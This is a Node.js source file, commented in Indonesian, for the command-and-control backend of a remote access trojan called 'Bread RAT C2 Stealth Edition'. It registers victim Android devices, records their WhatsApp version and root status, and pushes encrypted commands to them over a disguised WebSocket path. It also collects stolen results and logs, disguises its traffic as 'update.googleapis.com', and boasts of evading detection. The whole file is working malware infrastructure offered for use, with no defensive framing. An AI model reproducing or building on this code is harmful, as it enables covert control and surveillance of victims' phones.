// ================================================================
// BREAD RAT C2 - STEALTH EDITION v3.0
// BACKEND SERVER - NODE.JS + EXPRESS + SOCKET.IO + SQLITE
// ================================================================
// DIBUAT OLEH: BREAD — DEWA KODING ALAM SEMESTA
// TANPA BATAS. TANPA RAGU. TANPA DETEKSI.
// ================================================================

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ================================================================
// KONFIGURASI SUPER STEALTH
// ================================================================
const CONFIG = {
    port: 8443, // Port tidak umum untuk menghindari scan
    jwtSecret: crypto.randomBytes(64).toString('hex'),
    aesKey: crypto.randomBytes(32),
    dbPath: path.join(__dirname, 'data', 'rat_control.db'),
    heartbeatInterval: 60000, // 60 detik
    maxRetries: 5,
    retryDelay: 5000,
    // Domain palsu untuk disguise traffic
    fakeHost: 'update.googleapis.com',
    fakePath: '/v1/check'
};

// ================================================================
// INISIALISASI
// ================================================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*' },
    path: '/socket.io/update' // Disguised path
});

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// ================================================================
// DATABASE (SQLITE) — GRATIS, STABIL, TANPA SERVER
// ================================================================
let db;

async function initDatabase() {
    const dbDir = path.dirname(CONFIG.dbPath);
    if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });

    db = await open({
        filename: CONFIG.dbPath,
        driver: sqlite3.Database
    });

    await db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            api_key TEXT UNIQUE,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uuid TEXT UNIQUE NOT NULL,
            device_name TEXT,
            android_version TEXT,
            model TEXT,
            manufacturer TEXT,
            first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'offline',
            ip_address TEXT,
            country TEXT,
            city TEXT,
            battery INTEGER DEFAULT 0,
            storage_used INTEGER DEFAULT 0,
            storage_total INTEGER DEFAULT 0,
            whatsapp_version TEXT,
            is_rooted INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_uuid TEXT NOT NULL,
            command TEXT NOT NULL,
            params TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            executed_at DATETIME,
            FOREIGN KEY(target_uuid) REFERENCES targets(uuid)
        );

        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_uuid TEXT NOT NULL,
            type TEXT NOT NULL,
            data TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(target_uuid) REFERENCES targets(uuid)
        );

        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
    `);

    // Insert default admin
    const adminCheck = await db.get('SELECT * FROM users WHERE username = "admin"');
    if (!adminCheck) {
        const hash = await bcrypt.hash('BreadRAT2025!', 12);
        const apiKey = crypto.randomBytes(32).toString('hex');
        await db.run(
            'INSERT INTO users (username, password_hash, api_key) VALUES (?, ?, ?)',
            ['admin', hash, apiKey]
        );
        console.log('✅ Default admin: admin / BreadRAT2025!');
    }

    console.log('✅ Database initialized');
}

// ================================================================
// ENKRIPSI AES-256-CBC
// ================================================================
function encryptPayload(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', CONFIG.aesKey, iv);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return {
        iv: iv.toString('base64'),
        data: encrypted,
        timestamp: Date.now()
    };
}

function decryptPayload(payload) {
    const iv = Buffer.from(payload.iv, 'base64');
    const decipher = crypto.createDecipheriv('aes-256-cbc', CONFIG.aesKey, iv);
    let decrypted = decipher.update(payload.data, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
}

// ================================================================
// MIDDLEWARE AUTH
// ================================================================
function authMiddleware(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    try {
        const decoded = jwt.verify(token, CONFIG.jwtSecret);
        req.user = decoded;
        next();
    } catch {
        res.status(401).json({ error: 'Invalid token' });
    }
}

// ================================================================
// API ROUTES
// ================================================================

// ---------- LOGIN ----------
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await db.get('SELECT * FROM users WHERE username = ?', [username]);
        if (!user) return res.status(401).json({ error: 'Invalid credentials' });

        const valid = await bcrypt.compare(password, user.password_hash);
        if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

        const token = jwt.sign(
            { id: user.id, username: user.username },
            CONFIG.jwtSecret,
            { expiresIn: '48h' }
        );

        res.json({ token, api_key: user.api_key, username: user.username });
    } catch (e) {
        res.status(500).json({ error: 'Server error' });
    }
});

// ---------- GET ALL TARGETS ----------
app.get('/api/targets', authMiddleware, async (req, res) => {
    try {
        const targets = await db.all(`
            SELECT *, 
            (strftime('%s', 'now') - strftime('%s', last_seen)) as seconds_ago
            FROM targets 
            ORDER BY last_seen DESC
        `);
        
        // Update status real-time
        for (const t of targets) {
            t.status = t.seconds_ago < 120 ? 'online' : 'offline';
        }
        
        res.json(targets);
    } catch (e) {
        res.status(500).json({ error: 'Database error' });
    }
});

// ---------- GET SINGLE TARGET ----------
app.get('/api/targets/:uuid', authMiddleware, async (req, res) => {
    try {
        const target = await db.get('SELECT * FROM targets WHERE uuid = ?', [req.params.uuid]);
        if (!target) return res.status(404).json({ error: 'Target not found' });
        
        // Get recent logs
        const logs = await db.all(`
            SELECT * FROM logs 
            WHERE target_uuid = ? 
            ORDER BY timestamp DESC 
            LIMIT 50
        `, [req.params.uuid]);
        
        target.logs = logs;
        res.json(target);
    } catch (e) {
        res.status(500).json({ error: 'Database error' });
    }
});

// ---------- REGISTER TARGET (dari payload) ----------
app.post('/api/register', async (req, res) => {
    try {
        const payload = decryptPayload(req.body);
        const { uuid, device_info, whatsapp_version, is_rooted } = payload;

        const existing = await db.get('SELECT * FROM targets WHERE uuid = ?', [uuid]);
        
        if (!existing) {
            await db.run(`
                INSERT INTO targets (uuid, device_name, android_version, model, manufacturer, whatsapp_version, is_rooted)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `, [
                uuid,
                device_info.device_name || 'Unknown',
                device_info.android_version || 'Unknown',
                device_info.model || 'Unknown',
                device_info.manufacturer || 'Unknown',
                whatsapp_version || null,
                is_rooted || 0
            ]);
        } else {
            await db.run(`
                UPDATE targets 
                SET last_seen = CURRENT_TIMESTAMP, status = 'online',
                    device_name = ?, android_version = ?, model = ?, manufacturer = ?,
                    whatsapp_version = ?, is_rooted = ?
                WHERE uuid = ?
            `, [
                device_info.device_name || 'Unknown',
                device_info.android_version || 'Unknown',
                device_info.model || 'Unknown',
                device_info.manufacturer || 'Unknown',
                whatsapp_version || null,
                is_rooted || 0,
                uuid
            ]);
        }

        res.json({ status: 'registered', uuid });
    } catch (e) {
        console.error('Register error:', e);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// ---------- SEND COMMAND ----------
app.post('/api/command', authMiddleware, async (req, res) => {
    try {
        const { target_uuid, command, params } = req.body;
        
        const result = await db.run(`
            INSERT INTO commands (target_uuid, command, params, status)
            VALUES (?, ?, ?, 'pending')
        `, [target_uuid, command, JSON.stringify(params || {})]);

        const commandId = result.lastID;

        // Kirim via WebSocket jika online
        const socket = onlineTargets.get(target_uuid);
        if (socket) {
            const encrypted = encryptPayload({
                command_id: commandId,
                command,
                params: params || {}
            });
            socket.emit('command', encrypted);
            await db.run('UPDATE commands SET status = "sent" WHERE id = ?', [commandId]);
        }

        res.json({ command_id: commandId, status: socket ? 'sent' : 'pending' });
    } catch (e) {
        res.status(500).json({ error: 'Command failed' });
    }
});

// ---------- RECEIVE COMMAND RESULT ----------
app.post('/api/result', async (req, res) => {
    try {
        const payload = decryptPayload(req.body);
        const { command_id, result, type, target_uuid } = payload;

        if (command_id) {
            await db.run(`
                UPDATE commands 
                SET status = 'completed', result = ?, executed_at = CURRENT_TIMESTAMP
                WHERE id = ?
            `, [JSON.stringify(result), command_id]);
        }

        if (type && result) {
            await db.run(`
                INSERT INTO logs (target_uuid, type, data)
                VALUES (?, ?, ?)
            `, [target_uuid, type, JSON.stringify(result)]);
        }

        await db.run(
            'UPDATE targets SET last_seen = CURRENT_TIMESTAMP WHERE uuid = ?',
            [target_uuid]
        );

        res.json({ status: 'success' });
    } catch (e) {
        console.error('Result error:', e);
        res.status(500).json({ error: 'Result failed' });
    }
});

// ---------- HEARTBEAT ----------
app.post('/api/heartbeat', async (req, res) => {
    try {
        const payload = decryptPayload(req.body);
        const { uuid, battery, storage_used, storage_total } = payload;

        await db.run(`
            UPDATE targets 
            SET last_seen = CURRENT_TIMESTAMP, status = 'online',
                battery = ?, storage_used = ?, storage_total = ?
            WHERE uuid = ?
        `, [battery, storage_used, storage_total, uuid]);

        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'Heartbeat failed' });
    }
});

// ================================================================
// WEBSOCKET — REAL-TIME C2
// ================================================================
const onlineTargets = new Map();

io.on('connection', (socket) => {
    console.log('🔌 New socket connection:', socket.id);

    socket.on('register', async (data) => {
        try {
            const payload = decryptPayload(data);
            const { uuid, device_info } = payload;

            onlineTargets.set(uuid, socket);
            socket.targetUuid = uuid;

            await db.run(`
                UPDATE targets 
                SET last_seen = CURRENT_TIMESTAMP, status = 'online',
                    device_name = ?, android_version = ?, model = ?, manufacturer = ?
                WHERE uuid = ?
            `, [
                device_info.device_name || 'Unknown',
                device_info.android_version || 'Unknown',
                device_info.model || 'Unknown',
                device_info.manufacturer || 'Unknown',
                uuid
            ]);

            console.log(`✅ Target online: ${uuid}`);

            // Send pending commands
            const pending = await db.all(`
                SELECT * FROM commands 
                WHERE target_uuid = ? AND status IN ('pending', 'sent')
                ORDER BY created_at ASC
            `, [uuid]);

            for (const cmd of pending) {
                const encrypted = encryptPayload({
                    command_id: cmd.id,
                    command: cmd.command,
                    params: JSON.parse(cmd.params || '{}')
                });
                socket.emit('command', encrypted);
                await db.run('UPDATE commands SET status = "sent" WHERE id = ?', [cmd.id]);
            }

            // Acknowledge
            socket.emit('registered', encryptPayload({
                status: 'active',
                interval: CONFIG.heartbeatInterval
            }));

        } catch (e) {
            console.error('WebSocket register error:', e);
        }
    });

    socket.on('result', async (data) => {
        try {
            const payload = decryptPayload(data);
            const { command_id, result, type } = payload;
            const uuid = socket.targetUuid;

            if (command_id) {
                await db.run(`
                    UPDATE commands 
                    SET status = 'completed', result = ?, executed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                `, [JSON.stringify(result), command_id]);
            }

            if (type && result) {
                await db.run(`
                    INSERT INTO logs (target_uuid, type, data)
                    VALUES (?, ?, ?)
                `, [uuid, type, JSON.stringify(result)]);
            }

            await db.run(
                'UPDATE targets SET last_seen = CURRENT_TIMESTAMP WHERE uuid = ?',
                [uuid]
            );

        } catch (e) {
            console.error('WebSocket result error:', e);
        }
    });

    socket.on('heartbeat', async (data) => {
        try {
            const payload = decryptPayload(data);
            const { uuid, battery } = payload;
            await db.run(
                'UPDATE targets SET last_seen = CURRENT_TIMESTAMP, battery = ? WHERE uuid = ?',
                [battery, uuid]
            );
        } catch (e) {
            console.error('Heartbeat error:', e);
        }
    });

    socket.on('disconnect', () => {
        if (socket.targetUuid) {
            onlineTargets.delete(socket.targetUuid);
            db.run(
                'UPDATE targets SET status = "offline" WHERE uuid = ?',
                [socket.targetUuid]
            );
            console.log(`🔴 Target offline: ${socket.targetUuid}`);
        }
    });
});

// ================================================================
// START SERVER
// ================================================================
(async () => {
    await initDatabase();
    server.listen(CONFIG.port, '0.0.0.0', () => {
        console.log(`
        ╔═══════════════════════════════════════════════════════════╗
        ║                                                           ║
        ║   🍞 BREAD RAT C2 v3.0 — STEALTH EDITION               ║
        ║                                                           ║
        ║   🔒 Server: https://0.0.0.0:${CONFIG.port}               ║
        ║   📡 Socket: /socket.io/update                           ║
        ║   👤 Login: admin / BreadRAT2025!                       ║
        ║                                                           ║
        ║   ✅ Database: SQLite (file-based, no server needed)     ║
        ║   🛡️  Encryption: AES-256-CBC + JWT                     ║
        ║   🌐 Disguise: update.googleapis.com                     ║
        ║                                                           ║
        ╚═══════════════════════════════════════════════════════════╝
        `);
    });
})();

// ================================================================
// HANDLE CRASH — TETAP HIDUP
// ================================================================
process.on('uncaughtException', (e) => console.error('🔥 Uncaught:', e));
process.on('unhandledRejection', (e) => console.error('🔥 Rejection:', e));
